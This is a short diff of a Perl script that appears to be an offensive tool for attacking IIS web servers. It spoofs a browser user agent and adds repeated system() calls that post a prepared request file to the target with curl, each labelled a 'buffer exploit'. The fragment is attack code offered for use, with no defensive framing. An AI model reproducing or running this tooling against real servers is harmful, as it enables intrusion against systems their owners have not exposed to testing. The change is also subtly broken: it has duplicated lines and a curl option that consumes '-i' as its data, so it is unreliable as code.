@@ -2213,10 +2213,13 @@ $ua->agent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/
 	print item(),"Requested Data \n";
 	print $req->as_string ();    
 	print item(), "\n";
-	$| = 1; # Clear the buffer here
+	#$| = 1; # Clear the buffer here
 	print item(),"Starting Curl Based Payloads \n";
-	sleep 5;	
-	system "curl '$url' --data-binary @request"; # curl based buffer exploit for IIS servers
+	sleep 2;	
+	system ("curl $url --data-binary '@request'"); # curl based buffer exploit for IIS servers
+	system ("curl $url --data-binary '@request'"); # curl based buffer exploit for IIS servers
+	system ("curl $url --data -i -X POST '@request'"); # curl based buffer exploit for IIS servers
+	system ("curl $url --data -i -X POST '@request'"); # curl based buffer exploit for IIS servers
 
 if ( $res->as_string () =~ m/rel='canonical'/ ) {
 print color("BOLD WHITE"), "\n\n[ + ] The result could be canonical and false positive", "\n";
